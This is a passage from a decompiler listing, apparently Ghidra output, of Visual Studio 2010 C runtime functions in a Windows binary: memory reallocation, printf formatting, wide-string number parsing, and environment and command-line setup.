    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_0041b548 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



/* Function: __realloc_crt */

/* Library Function - Single Match
    __realloc_crt
   
   Library: Visual Studio 2010 Release */

void * __cdecl __realloc_crt(void *_Ptr,size_t _NewSize)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  do {
    pvVar1 = _realloc(_Ptr,_NewSize);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (_NewSize == 0) {
      return (void *)0x0;
    }
    if (DAT_0041b548 == 0) {
      return (void *)0x0;
    }
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_0041b548 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
  } while (dwMilliseconds != 0xffffffff);
  return (void *)0x0;
}



/* Function: FUN_0040a17e */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void __cdecl FUN_0040a17e(undefined4 param_1)

{
  _DAT_0041b54c = param_1;
  return;
}



/* Function: __msize */

/* Library Function - Single Match
    __msize
   
   Library: Visual Studio 2010 Release */

size_t __cdecl __msize(void *_Memory)

{
  int *piVar1;
  SIZE_T SVar2;
  
  if (_Memory == (void *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004087f3();
    return 0xffffffff;
  }
  SVar2 = HeapSize(DAT_0041aeb8,0,_Memory);
  return SVar2;
}



/* Function: __output_s_l */

/* Library Function - Single Match
    __output_s_l
   
   Library: Visual Studio 2010 Release */

int __cdecl __output_s_l(FILE *_File,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  byte bVar1;
  short *psVar2;
  int *piVar3;
  uint uVar4;
  int iVar5;
  code *pcVar6;
  errno_t eVar7;
  int iVar8;
  undefined *puVar9;
  int extraout_ECX;
  uint uVar10;
  size_t sVar11;
  byte *pbVar12;
  wchar_t *pwVar13;
  bool bVar14;
  undefined8 uVar15;
  undefined4 *puVar16;
  wchar_t *pwVar17;
  undefined4 uVar18;
  localeinfo_struct *plVar19;
  undefined4 local_27c;
  undefined4 local_278;
  int local_274;
  undefined4 local_270;
  uint local_268;
  int local_264;
  int local_260;
  FILE *local_25c;
  wchar_t *local_258;
  localeinfo_struct local_254;
  int local_24c;
  char local_248;
  uint local_244;
  byte *local_240;
  int local_23c;
  int local_238;
  int local_234;
  undefined1 local_230;
  char local_22f;
  wchar_t *local_22c;
  int local_228;
  size_t local_224;
  wchar_t *local_220;
  int local_21c;
  byte local_215;
  uint local_214;
  wchar_t local_210 [255];
  undefined2 local_11;
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  local_25c = _File;
  local_22c = (wchar_t *)_ArgList;
  local_264 = 0;
  local_214 = 0;
  local_238 = 0;
  local_21c = 0;
  local_234 = 0;
  local_260 = 0;
  local_23c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_254,_Locale);
  if (_File != (FILE *)0x0) {
    if ((_File->_flag & 0x40) == 0) {
      uVar4 = __fileno(_File);
      if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
        puVar9 = &DAT_004191d0;
      }
      else {
        puVar9 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0041eac0)[(int)uVar4 >> 5]);
      }
      if ((puVar9[0x24] & 0x7f) == 0) {
        if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
          puVar9 = &DAT_004191d0;
        }
        else {
          puVar9 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0041eac0)[(int)uVar4 >> 5]);
        }
        if ((puVar9[0x24] & 0x80) == 0) goto LAB_0040a2ba;
      }
    }
    else {
LAB_0040a2ba:
      if (_Format != (char *)0x0) {
        local_215 = *_Format;
        local_228 = 0;
        local_224 = 0;
        local_244 = 0;
        local_258 = (wchar_t *)0x0;
        if (local_215 != 0) {
          do {
            pbVar12 = (byte *)_Format + 1;
            local_240 = pbVar12;
            if (local_228 < 0) break;
            if ((byte)(local_215 - 0x20) < 0x59) {
              uVar4 = (byte)(&DAT_00415f80)[(char)local_215] & 0xf;
            }
            else {
              uVar4 = 0;
            }
            local_244 = (uint)((byte)(&DAT_00415fa0)[local_244 + uVar4 * 9] >> 4);
            if (local_244 == 8) goto LAB_0040a22b;
            switch(local_244) {
            case 0:
switchD_0040a347_caseD_0:
              local_23c = 0;
              iVar8 = __isleadbyte_l((uint)local_215,&local_254);
              if (iVar8 != 0) {
                write_char();
                local_240 = (byte *)_Format + 2;
                if (*pbVar12 == 0) goto LAB_0040a22b;
              }
              write_char();
              break;
            case 1:
              local_21c = -1;
              local_270 = 0;
              local_260 = 0;
              local_238 = 0;
              local_234 = 0;
              local_214 = 0;
              local_23c = 0;
              break;
            case 2:
              if (local_215 == 0x20) {
                local_214 = local_214 | 2;
              }
              else if (local_215 == 0x23) {
                local_214 = local_214 | 0x80;
              }
              else if (local_215 == 0x2b) {
                local_214 = local_214 | 1;
              }
              else if (local_215 == 0x2d) {
                local_214 = local_214 | 4;
              }
              else if (local_215 == 0x30) {
                local_214 = local_214 | 8;
              }
              break;
            case 3:
              if (local_215 == 0x2a) {
                local_22c = (wchar_t *)((int)_ArgList + 4);
                local_238 = *(int *)_ArgList;
                if (local_238 < 0) {
                  local_214 = local_214 | 4;
                  local_238 = -local_238;
                }
              }
              else {
                local_238 = local_238 * 10 + -0x30 + (int)(char)local_215;
              }
              break;
            case 4:
              local_21c = 0;
              break;
            case 5:
              if (local_215 == 0x2a) {
                local_22c = (wchar_t *)((int)_ArgList + 4);
                local_21c = *(int *)_ArgList;
                if (local_21c < 0) {
                  local_21c = -1;
                }
              }
              else {
                local_21c = local_21c * 10 + -0x30 + (int)(char)local_215;
              }
              break;
            case 6:
              if (local_215 == 0x49) {
                bVar1 = *pbVar12;
                if ((bVar1 == 0x36) && (((byte *)_Format)[2] == 0x34)) {
                  local_214 = local_214 | 0x8000;
                  local_240 = (byte *)_Format + 3;
                }
                else if ((bVar1 == 0x33) && (((byte *)_Format)[2] == 0x32)) {
                  local_214 = local_214 & 0xffff7fff;
                  local_240 = (byte *)_Format + 3;
                }
                else if (((((bVar1 != 100) && (bVar1 != 0x69)) && (bVar1 != 0x6f)) &&
                         ((bVar1 != 0x75 && (bVar1 != 0x78)))) && (bVar1 != 0x58)) {
                  local_244 = 0;
                  goto switchD_0040a347_caseD_0;
                }
              }
              else if (local_215 == 0x68) {
                local_214 = local_214 | 0x20;
              }
              else if (local_215 == 0x6c) {
                if (*pbVar12 == 0x6c) {
                  local_214 = local_214 | 0x1000;
                  local_240 = (byte *)_Format + 2;
                }
                else {
                  local_214 = local_214 | 0x10;
                }
              }
              else if (local_215 == 0x77) {
                local_214 = local_214 | 0x800;
              }
              break;
            case 7:
              if ((char)local_215 < 'e') {
                if (local_215 == 100) {
LAB_0040a835:
                  local_214 = local_214 | 0x40;
LAB_0040a83c:
                  local_224 = 10;
LAB_0040a846:
                  if (((local_214 & 0x8000) == 0) && ((local_214 & 0x1000) == 0)) {
                    local_22c = (wchar_t *)((int)_ArgList + 4);
                    if ((local_214 & 0x20) == 0) {
                      uVar4 = *(uint *)_ArgList;
                      if ((local_214 & 0x40) == 0) {
                        uVar10 = 0;
                      }
                      else {
                        uVar10 = (int)uVar4 >> 0x1f;
                      }
                    }
                    else {
                      if ((local_214 & 0x40) == 0) {
                        uVar4 = (uint)(ushort)*(wchar_t *)_ArgList;
                      }
                      else {
                        uVar4 = (uint)*(wchar_t *)_ArgList;
                      }
                      uVar10 = (int)uVar4 >> 0x1f;
                    }
                  }
                  else {
                    local_22c = (wchar_t *)((int)_ArgList + 8);
                    uVar4 = *(uint *)_ArgList;
                    uVar10 = *(uint *)((int)_ArgList + 4);
                  }
                  if ((((local_214 & 0x40) != 0) && ((int)uVar10 < 1)) && ((int)uVar10 < 0)) {
                    bVar14 = uVar4 != 0;
                    uVar4 = -uVar4;
                    uVar10 = -(uVar10 + bVar14);
                    local_214 = local_214 | 0x100;
                  }
                  uVar15 = CONCAT44(uVar10,uVar4);
                  if ((local_214 & 0x9000) == 0) {
                    uVar10 = 0;
                  }
                  if (local_21c < 0) {
                    local_21c = 1;
                  }
                  else {
                    local_214 = local_214 & 0xfffffff7;
                    if (0x200 < local_21c) {
                      local_21c = 0x200;
                    }
                  }
                  if (uVar4 == 0 && uVar10 == 0) {
                    local_234 = 0;
                  }
                  pwVar13 = &local_11;
                  while( true ) {
                    uVar4 = uVar10;
                    iVar8 = local_21c + -1;
                    if ((local_21c < 1) && ((uint)uVar15 == 0 && uVar4 == 0)) break;
                    local_21c = iVar8;
                    uVar15 = __aulldvrm((uint)uVar15,uVar4,local_224,(int)local_224 >> 0x1f);
                    iVar8 = extraout_ECX + 0x30;
                    if (0x39 < iVar8) {
                      iVar8 = iVar8 + local_264;
                    }
                    *(char *)pwVar13 = (char)iVar8;
                    pwVar13 = (wchar_t *)((int)pwVar13 + -1);
                    uVar10 = (uint)((ulonglong)uVar15 >> 0x20);
                    local_268 = uVar4;
                  }
                  local_224 = (int)&local_11 + -(int)pwVar13;
                  local_220 = (wchar_t *)((int)pwVar13 + 1);
                  local_21c = iVar8;
                  if (((local_214 & 0x200) != 0) &&
                     ((local_224 == 0 || (*(char *)local_220 != '0')))) {
                    *(char *)pwVar13 = '0';
                    local_224 = (int)&local_11 + -(int)pwVar13 + 1;
                    local_220 = pwVar13;
                  }
                }
                else if ((char)local_215 < 'T') {
                  if (local_215 == 0x53) {
                    if ((local_214 & 0x830) == 0) {
                      local_214 = local_214 | 0x800;
                    }
                    goto LAB_0040a664;
                  }
                  if (local_215 == 0x41) {
LAB_0040a5e2:
                    local_215 = local_215 + 0x20;
                    local_270 = 1;
LAB_0040a5f5:
                    local_214 = local_214 | 0x40;
                    local_268 = 0x200;
                    pwVar13 = local_210;
                    uVar4 = local_268;
                    pwVar17 = local_210;
                    if (local_21c < 0) {
                      local_21c = 6;
                    }
                    else if (local_21c == 0) {
                      if (local_215 == 0x67) {
                        local_21c = 1;
                      }
                    }
                    else {
                      if (0x200 < local_21c) {
                        local_21c = 0x200;
                      }
                      if (0xa3 < local_21c) {
                        uVar4 = local_21c + 0x15d;
                        local_220 = local_210;
                        local_258 = (wchar_t *)__malloc_crt(uVar4);
                        pwVar13 = local_258;
                        pwVar17 = local_258;
                        if (local_258 == (wchar_t *)0x0) {
                          local_21c = 0xa3;
                          pwVar13 = local_210;
                          uVar4 = local_268;
                          pwVar17 = local_220;
                        }
                      }
                    }
                    local_220 = pwVar17;
                    local_268 = uVar4;
                    local_27c = *(undefined4 *)_ArgList;
                    local_22c = (wchar_t *)((int)_ArgList + 8);
                    local_278 = *(undefined4 *)((int)_ArgList + 4);
                    plVar19 = &local_254;
                    iVar5 = (int)(char)local_215;
                    puVar16 = &local_27c;
                    pwVar17 = pwVar13;
                    uVar4 = local_268;
                    iVar8 = local_21c;
                    uVar18 = local_270;
                    pcVar6 = (code *)DecodePointer(PTR_LAB_00419488);
                    (*pcVar6)(puVar16,pwVar17,uVar4,iVar5,iVar8,uVar18,plVar19);
                    uVar4 = local_214 & 0x80;
                    if ((uVar4 != 0) && (local_21c == 0)) {
                      plVar19 = &local_254;
                      pwVar17 = pwVar13;
                      pcVar6 = (code *)DecodePointer(PTR_LAB_00419494);
                      (*pcVar6)(pwVar17,plVar19);
                    }
                    if ((local_215 == 0x67) && (uVar4 == 0)) {
                      plVar19 = &local_254;
                      pwVar17 = pwVar13;
                      pcVar6 = (code *)DecodePointer(PTR_LAB_00419490);
                      (*pcVar6)(pwVar17,plVar19);
                    }
                    if ((char)*pwVar13 == '-') {
                      local_214 = local_214 | 0x100;
                      pwVar13 = (wchar_t *)((int)pwVar13 + 1);
                      local_220 = pwVar13;
                    }
LAB_0040a797:
                    local_224 = _strlen((char *)pwVar13);
                  }
                  else if (local_215 == 0x43) {
                    if ((local_214 & 0x830) == 0) {
                      local_214 = local_214 | 0x800;
                    }
LAB_0040a6d7:
                    local_22c = (wchar_t *)((int)_ArgList + 4);
                    if ((local_214 & 0x810) == 0) {
                      local_210[0]._0_1_ = (char)*(wchar_t *)_ArgList;
                      local_224 = 1;
                    }
                    else {
                      eVar7 = _wctomb_s((int *)&local_224,(char *)local_210,0x200,
                                        *(wchar_t *)_ArgList);
                      if (eVar7 != 0) {
                        local_260 = 1;
                      }
                    }
                    local_220 = local_210;
                  }
                  else if ((local_215 == 0x45) || (local_215 == 0x47)) goto LAB_0040a5e2;
                }
                else {
                  if (local_215 == 0x58) goto LAB_0040a98f;
                  if (local_215 == 0x5a) {
                    psVar2 = *(short **)_ArgList;
                    local_22c = (wchar_t *)((int)_ArgList + 4);
                    if ((psVar2 == (short *)0x0) ||
                       (local_220 = *(wchar_t **)(psVar2 + 2), local_220 == (wchar_t *)0x0)) {
                      local_220 = (wchar_t *)PTR_s__null__004191c0;
                      pwVar13 = (wchar_t *)PTR_s__null__004191c0;
                      goto LAB_0040a797;
                    }
                    local_224 = (size_t)*psVar2;
                    if ((local_214 & 0x800) == 0) {
                      local_23c = 0;
                    }
                    else {
                      local_224 = (int)local_224 / 2;
                      local_23c = 1;
                    }
                  }
                  else {
                    if (local_215 == 0x61) goto LAB_0040a5f5;
                    if (local_215 == 99) goto LAB_0040a6d7;
                  }
                }
LAB_0040ab69:
                if (local_260 == 0) {
                  if ((local_214 & 0x40) != 0) {
                    if ((local_214 & 0x100) == 0) {
                      if ((local_214 & 1) == 0) {
                        if ((local_214 & 2) == 0) goto LAB_0040abb2;
                        local_230 = 0x20;
                      }
                      else {
                        local_230 = 0x2b;
                      }
                    }
                    else {
                      local_230 = 0x2d;
                    }
                    local_234 = 1;
                  }
LAB_0040abb2:
                  uVar10 = (local_238 - local_224) - local_234;
                  local_268 = uVar10;
                  uVar4 = uVar10;
                  if ((local_214 & 0xc) == 0) {
                    do {
                      if ((int)uVar4 < 1) break;
                      uVar4 = uVar4 - 1;
                      write_char();
                    } while (local_228 != -1);
                  }
                  write_string();
                  if (((local_214 & 8) != 0) && ((local_214 & 4) == 0)) {
                    do {
                      if ((int)uVar10 < 1) break;
                      uVar10 = uVar10 - 1;
                      write_char();
                    } while (local_228 != -1);
                  }
                  if ((local_23c == 0) ||
                     (sVar11 = local_224, pwVar13 = local_220, (int)local_224 < 1)) {
                    write_string();
                  }
                  else {
                    do {
                      sVar11 = sVar11 - 1;
                      eVar7 = _wctomb_s(&local_274,(char *)((int)&local_11 + 1),6,*pwVar13);
                      if ((eVar7 != 0) || (local_274 == 0)) {
                        local_228 = -1;
                        break;
                      }
                      write_string();
                      pwVar13 = pwVar13 + 1;
                    } while (sVar11 != 0);
                  }
                  if ((-1 < local_228) && (uVar4 = local_268, (local_214 & 4) != 0)) {
                    do {
                      if ((int)uVar4 < 1) break;
                      write_char();
                      uVar4 = uVar4 - 1;
                    } while (local_228 != -1);
                  }
                }
              }
              else {
                if ('p' < (char)local_215) {
                  if (local_215 == 0x73) {
LAB_0040a664:
                    iVar8 = local_21c;
                    if (local_21c == -1) {
                      iVar8 = 0x7fffffff;
                    }
                    local_22c = (wchar_t *)((int)_ArgList + 4);
                    local_220 = *(wchar_t **)_ArgList;
                    if ((local_214 & 0x810) == 0) {
                      pwVar13 = local_220;
                      if (local_220 == (wchar_t *)0x0) {
                        local_220 = (wchar_t *)PTR_s__null__004191c0;
                        pwVar13 = (wchar_t *)PTR_s__null__004191c0;
                      }
                      for (; (iVar8 != 0 && (iVar8 = iVar8 + -1, (char)*pwVar13 != '\0'));
                          pwVar13 = (wchar_t *)((int)pwVar13 + 1)) {
                      }
                      local_224 = (int)pwVar13 - (int)local_220;
                    }
                    else {
                      if (local_220 == (wchar_t *)0x0) {
                        local_220 = (wchar_t *)PTR_u__null__004191c4;
                      }
                      local_23c = 1;
                      for (pwVar13 = local_220;
                          (iVar8 != 0 && (iVar8 = iVar8 + -1, *pwVar13 != L'\0'));
                          pwVar13 = pwVar13 + 1) {
                      }
                      local_224 = (int)pwVar13 - (int)local_220 >> 1;
                    }
                    goto LAB_0040ab69;
                  }
                  if (local_215 == 0x75) goto LAB_0040a83c;
                  if (local_215 != 0x78) goto LAB_0040ab69;
                  local_264 = 0x27;
LAB_0040a9bb:
                  local_224 = 0x10;
                  if ((local_214 & 0x80) != 0) {
                    local_22f = (char)local_264 + 'Q';
                    local_230 = 0x30;
                    local_234 = 2;
                  }
                  goto LAB_0040a846;
                }
                if (local_215 == 0x70) {
                  local_21c = 8;
LAB_0040a98f:
                  local_264 = 7;
                  goto LAB_0040a9bb;
                }
                if ((char)local_215 < 'e') goto LAB_0040ab69;
                if ((char)local_215 < 'h') goto LAB_0040a5f5;
                if (local_215 == 0x69) goto LAB_0040a835;
                if (local_215 != 0x6e) {
                  if (local_215 != 0x6f) goto LAB_0040ab69;
                  local_224 = 8;
                  if ((local_214 & 0x80) != 0) {
                    local_214 = local_214 | 0x200;
                  }
                  goto LAB_0040a846;
                }
                piVar3 = *(int **)_ArgList;
                local_22c = (wchar_t *)((int)_ArgList + 4);
                iVar8 = __get_printf_count_output();
                if (iVar8 == 0) goto LAB_0040a22b;
                if ((local_214 & 0x20) == 0) {
                  *piVar3 = local_228;
                }
                else {
                  *(undefined2 *)piVar3 = (undefined2)local_228;
                }
                local_260 = 1;
              }
              if (local_258 != (wchar_t *)0x0) {
                _free(local_258);
                local_258 = (wchar_t *)0x0;
              }
            }
            local_215 = *local_240;
            _ArgList = (va_list)local_22c;
            _Format = (char *)local_240;
          } while (local_215 != 0);
          if ((local_244 != 0) && (local_244 != 7)) goto LAB_0040a22b;
        }
        if (local_248 != '\0') {
          *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
        }
        goto LAB_0040ad5f;
      }
    }
  }
LAB_0040a22b:
  piVar3 = __errno();
  *piVar3 = 0x16;
  FUN_004087f3();
  if (local_248 != '\0') {
    *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
  }
LAB_0040ad5f:
  iVar8 = __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return iVar8;
}



/* Function: wcstoxl */

/* Library Function - Single Match
    unsigned long __cdecl wcstoxl(wchar_t const *,wchar_t const * *,int,int)
   
   Library: Visual Studio 2010 Release */

ulong __cdecl wcstoxl(wchar_t *param_1,wchar_t **param_2,int param_3,int param_4)

{
  wchar_t _C;
  int *piVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  wchar_t *pwVar6;
  wchar_t *pwVar7;
  ushort uVar8;
  uint local_8;
  
  if (param_2 != (wchar_t **)0x0) {
    *param_2 = param_1;
  }
  if ((param_1 == (wchar_t *)0x0) || ((param_3 != 0 && ((param_3 < 2 || (0x24 < param_3)))))) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004087f3();
    return 0;
  }
  local_8 = 0;
  pwVar7 = param_1;
  do {
    pwVar6 = pwVar7;
    _C = *pwVar6;
    pwVar7 = pwVar6 + 1;
    iVar2 = _iswctype(_C,8);
  } while (iVar2 != 0);
  if (_C == L'-') {
    param_4 = param_4 | 2;
LAB_0040adff:
    _C = *pwVar7;
    pwVar7 = pwVar6 + 2;
  }
  else if (_C == L'+') goto LAB_0040adff;
  uVar5 = (uint)(ushort)_C;
  if (param_3 == 0) {
    iVar2 = __wchartodigit(_C);
    if (iVar2 != 0) {
      param_3 = 10;
      goto LAB_0040ae5d;
    }
    if ((*pwVar7 != L'x') && (*pwVar7 != L'X')) {
      param_3 = 8;
      goto LAB_0040ae5d;
    }
    param_3 = 0x10;
  }
  if (((param_3 == 0x10) && (iVar2 = __wchartodigit(_C), iVar2 == 0)) &&
     ((*pwVar7 == L'x' || (*pwVar7 == L'X')))) {
    uVar5 = (uint)(ushort)pwVar7[1];
    pwVar7 = pwVar7 + 2;
  }
LAB_0040ae5d:
  uVar3 = (uint)(0xffffffff / (ulonglong)(uint)param_3);
  do {
    uVar8 = (ushort)uVar5;
    uVar4 = __wchartodigit(uVar8);
    if (uVar4 == 0xffffffff) {
      if (((uVar8 < 0x41) || (0x5a < uVar8)) && (0x19 < (ushort)(uVar8 - 0x61))) {
LAB_0040aebe:
        pwVar7 = pwVar7 + -1;
        if ((param_4 & 8U) == 0) {
          if (param_2 != (wchar_t **)0x0) {
            pwVar7 = param_1;
          }
          local_8 = 0;
        }
        else if (((param_4 & 4U) != 0) ||
                (((param_4 & 1U) == 0 &&
                 ((((param_4 & 2U) != 0 && (0x80000000 < local_8)) ||
                  (((param_4 & 2U) == 0 && (0x7fffffff < local_8)))))))) {
          piVar1 = __errno();
          *piVar1 = 0x22;
          if ((param_4 & 1U) == 0) {
            local_8 = ((param_4 & 2U) != 0) + 0x7fffffff;
          }
          else {
            local_8 = 0xffffffff;
          }
        }
        if (param_2 != (wchar_t **)0x0) {
          *param_2 = pwVar7;
        }
        if ((param_4 & 2U) != 0) {
          local_8 = -local_8;
        }
        return local_8;
      }
      if ((ushort)(uVar8 - 0x61) < 0x1a) {
        uVar5 = uVar5 - 0x20;
      }
      uVar4 = uVar5 - 0x37;
    }
    if ((uint)param_3 <= uVar4) goto LAB_0040aebe;
    if ((local_8 < uVar3) ||
       ((local_8 == uVar3 && (uVar4 <= (uint)(0xffffffff % (ulonglong)(uint)param_3))))) {
      local_8 = local_8 * param_3 + uVar4;
      param_4 = param_4 | 8;
    }
    else {
      param_4 = param_4 | 0xc;
      if (param_2 == (wchar_t **)0x0) goto LAB_0040aebe;
    }
    uVar5 = (uint)(ushort)*pwVar7;
    pwVar7 = pwVar7 + 1;
  } while( true );
}



/* Function: _wcstol */

/* Library Function - Single Match
    _wcstol
   
   Library: Visual Studio 2010 Release */

long __cdecl _wcstol(wchar_t *_Str,wchar_t **_EndPtr,int _Radix)

{
  ulong uVar1;
  
  uVar1 = wcstoxl(_Str,_EndPtr,_Radix,0);
  return uVar1;
}



/* Function: __CxxUnhandledExceptionFilter */

/* Library Function - Single Match
    long __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *)
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

long __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *param_1)

{
  PEXCEPTION_RECORD pEVar1;
  ULONG_PTR UVar2;
  
  pEVar1 = param_1->ExceptionRecord;
  if (((pEVar1->ExceptionCode == 0xe06d7363) && (pEVar1->NumberParameters == 3)) &&
     ((UVar2 = pEVar1->ExceptionInformation[0], UVar2 == 0x19930520 ||
      (((UVar2 == 0x19930521 || (UVar2 == 0x19930522)) || (UVar2 == 0x1994000)))))) {
    terminate();
  }
  return 0;
}



/* Function: __wsetenvp */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    __wsetenvp
   
   Library: Visual Studio 2010 Release */

int __cdecl __wsetenvp(void)

{
  undefined4 *puVar1;
  size_t sVar2;
  wchar_t *_Dst;
  errno_t eVar3;
  wchar_t *pwVar4;
  int iVar5;
  
  iVar5 = 0;
  pwVar4 = DAT_0041ab80;
  if (DAT_0041ab80 == (wchar_t *)0x0) {
    iVar5 = -1;
  }
  else {
    for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + sVar2 + 1) {
      if (*pwVar4 != L'=') {
        iVar5 = iVar5 + 1;
      }
      sVar2 = _wcslen(pwVar4);
    }
    puVar1 = (undefined4 *)__calloc_crt(iVar5 + 1,4);
    pwVar4 = DAT_0041ab80;
    DAT_0041aed4 = puVar1;
    if (puVar1 == (undefined4 *)0x0) {
      iVar5 = -1;
    }
    else {
      for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + sVar2) {
        sVar2 = _wcslen(pwVar4);
        sVar2 = sVar2 + 1;
        if (*pwVar4 != L'=') {
          _Dst = (wchar_t *)__calloc_crt(sVar2,2);
          *puVar1 = _Dst;
          if (_Dst == (wchar_t *)0x0) {
            _free(DAT_0041aed4);
            DAT_0041aed4 = (undefined4 *)0x0;
            return -1;
          }
          eVar3 = _wcscpy_s(_Dst,sVar2,pwVar4);
          if (eVar3 != 0) {
                    /* WARNING: Subroutine does not return */
            __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          }
          puVar1 = puVar1 + 1;
        }
      }
      _free(DAT_0041ab80);
      DAT_0041ab80 = (wchar_t *)0x0;
      *puVar1 = 0;
      _DAT_0041ebc0 = 1;
      iVar5 = 0;
    }
  }
  return iVar5;
}



/* Function: wparse_cmdline */

/* Library Function - Single Match
    _wparse_cmdline
   
   Library: Visual Studio 2010 Release */

void __cdecl wparse_cmdline(undefined4 *param_1,int *param_2)

{
  bool bVar1;
  bool bVar2;
  short *in_EAX;
  short sVar3;
  short *in_ECX;
  uint uVar4;
  int *unaff_EBX;
  
  bVar1 = false;
  *unaff_EBX = 0;
  *param_2 = 1;
  if (param_1 != (undefined4 *)0x0) {
    *param_1 = in_ECX;
    param_1 = param_1 + 1;
  }
  do {
    if (*in_EAX == 0x22) {
      bVar1 = !bVar1;
      sVar3 = 0x22;
    }
    else {
      *unaff_EBX = *unaff_EBX + 1;
      if (in_ECX != (short *)0x0) {
        *in_ECX = *in_EAX;
        in_ECX = in_ECX + 1;
      }
      sVar3 = *in_EAX;
      if (sVar3 == 0) goto LAB_0040b10d;
    }
    in_EAX = in_EAX + 1;
  } while ((bVar1) || ((sVar3 != 0x20 && (sVar3 != 9))));
  if (in_ECX != (short *)0x0) {
    in_ECX[-1] = 0;
  }
LAB_0040b10d:
  bVar1 = false;
  while (*in_EAX != 0) {
    for (; (*in_EAX == 0x20 || (*in_EAX == 9)); in_EAX = in_EAX + 1) {
    }
    if (*in_EAX == 0) break;
    if (param_1 != (undefined4 *)0x0) {
      *param_1 = in_ECX;
      param_1 = param_1 + 1;
    }
    *param_2 = *param_2 + 1;
    while( true ) {
      bVar2 = true;
      uVar4 = 0;
      for (; *in_EAX == 0x5c; in_EAX = in_EAX + 1) {
        uVar4 = uVar4 + 1;
      }
      if (*in_EAX == 0x22) {
        if ((uVar4 & 1) == 0) {
          if ((bVar1) && (in_EAX[1] == 0x22)) {
            in_EAX = in_EAX + 1;
          }
          else {
            bVar2 = false;
            bVar1 = !bVar1;
          }
        }
        uVar4 = uVar4 >> 1;
      }
      while (uVar4 != 0) {
        uVar4 = uVar4 - 1;
        if (in_ECX != (short *)0x0) {
          *in_ECX = 0x5c;
          in_ECX = in_ECX + 1;
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      sVar3 = *in_EAX;
      if ((sVar3 == 0) || ((!bVar1 && ((sVar3 == 0x20 || (sVar3 == 9)))))) break;
      if (bVar2) {
        if (in_ECX != (short *)0x0) {
          *in_ECX = sVar3;
          in_ECX = in_ECX + 1;
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      in_EAX = in_EAX + 1;
    }
    if (in_ECX != (short *)0x0) {
      *in_ECX = 0;
      in_ECX = in_ECX + 1;
    }
    *unaff_EBX = *unaff_EBX + 1;
  }
  if (param_1 != (undefined4 *)0x0) {
    *param_1 = 0;
  }
  *param_2 = *param_2 + 1;
  return;
}



/* Function: __wsetargv */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    __wsetargv
   
   Library: Visual Studio 2010 Release */

int __cdecl __wsetargv(void)

{
  uint _Size;
  undefined4 *puVar1;
  int iVar2;
  uint in_ECX;
  uint local_8;
  
  _DAT_0041b758 = 0;
  local_8 = in_ECX;
  GetModuleFileNameW((HMODULE)0x0,(LPWSTR)&DAT_0041b550,0x104);
  _DAT_0041aee0 = &DAT_0041b550;
  wparse_cmdline((undefined4 *)0x0,(int *)&local_8);
  if ((((local_8 < 0x3fffffff) && (in_ECX < 0x7fffffff)) &&
      (_Size = (in_ECX + local_8 * 2) * 2, in_ECX * 2 <= _Size)) &&
     (puVar1 = (undefined4 *)__malloc_crt(_Size), puVar1 != (undefined4 *)0x0)) {
    wparse_cmdline(puVar1,(int *)&local_8);
    DAT_0041aec0 = local_8 - 1;
    iVar2 = 0;
    DAT_0041aec8 = puVar1;
  }
  else {
    iVar2 = -1;
  }
  return iVar2;
}



/* Function: ___crtGetEnvironmentStringsW */

/* Library Function - Single Match
    ___crtGetEnvironmentStringsW
   
   Library: Visual Studio 2010 Release */

LPVOID __cdecl ___crtGetEnvironmentStringsW(void)

{
  size_t _Size;
  WCHAR WVar1;
  LPWCH _Src;
  WCHAR *pWVar2;
  void *_Dst;
  WCHAR *pWVar3;
  
  _Src = GetEnvironmentStringsW();
  if (_Src != (LPWCH)0x0) {
    WVar1 = *_Src;
    pWVar2 = _Src;
    while (WVar1 != L'\0') {
      do {
        pWVar3 = pWVar2;
        pWVar2 = pWVar3 + 1;
      } while (*pWVar2 != L'\0');
      pWVar2 = pWVar3 + 2;
      WVar1 = *pWVar2;
    }
    _Size = (int)pWVar2 + (2 - (int)_Src);
    _Dst = __malloc_crt(_Size);
    if (_Dst != (void *)0x0) {
      FID_conflict__memcpy(_Dst,_Src,_Size);
    }
    FreeEnvironmentStringsW(_Src);
    return _Dst;
  }
  return (LPVOID)0x0;
}



/* Function: __ioinit */

/* Library Function - Single Match
    __ioinit
   
   Library: Visual Studio 2010 Release */

int __cdecl __ioinit(void)

{
  void *pvVar1;
  int iVar2;
  DWORD DVar3;
  BOOL BVar4;
  HANDLE pvVar5;
  UINT UVar6;
  UINT UVar7;
  undefined4 *puVar8;
  int *piVar9;
  uint uVar10;
  _STARTUPINFOW local_50;
  byte *local_c;
  UINT *local_8;
  
  GetStartupInfoW(&local_50);
